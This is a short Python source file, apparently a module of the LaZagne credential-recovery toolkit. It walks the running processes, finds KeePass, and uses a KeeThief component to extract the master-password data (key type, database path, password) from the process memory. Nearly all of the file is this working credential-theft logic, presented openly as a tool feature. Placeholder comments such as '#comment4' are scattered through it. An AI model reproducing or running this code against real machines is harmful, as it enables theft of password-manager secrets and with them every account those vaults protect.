#!/usr/bin/env python
# -*- coding: utf-8 -*- 
#comment2
#comment4

from .keethief import KeeThief
from lazagne.config.module_info import ModuleInfo
from lazagne.config.constant import constant
from lazagne.config.winstructure import get_full_path_from_pid
from lazagne.config.lib.memorpy import *


#comment4

browser_list = ["iexplore.exe", "firefox.exe", "chrome.exe", "opera.exe", "MicrosoftEdge.exe", "microsoftedgecp.exe"]
keepass_process = 'keepass.exe'


class MemoryDump(ModuleInfo):
    def __init__(self):
        options = {'command': '-m', 'action': 'store_true', 'dest': 'memory_dump',
                   'help': 'retrieve browsers passwords from memory'}
        ModuleInfo.__init__(self, 'memory_dump', 'memory', options)

    def run(self):
        pwd_found = []
        for process in Process.list():
            #comment3

            if keepass_process in process.get('name', '').lower():
                full_exe_path = get_full_path_from_pid(process.get('pid'))
                k = KeeThief()
                if k.run(full_exe_path=full_exe_path):
                    for keepass in constant.keepass:
                        data = keepass.get('KcpPassword', None)
                        if data: 
                            pwd_found.append({
                                'Category': 'KeePass',
                                'KeyType': data['KeyType'],
                                'Login': data['Database'],
                                'Password': data['Password']
                            })

        return pwd_found
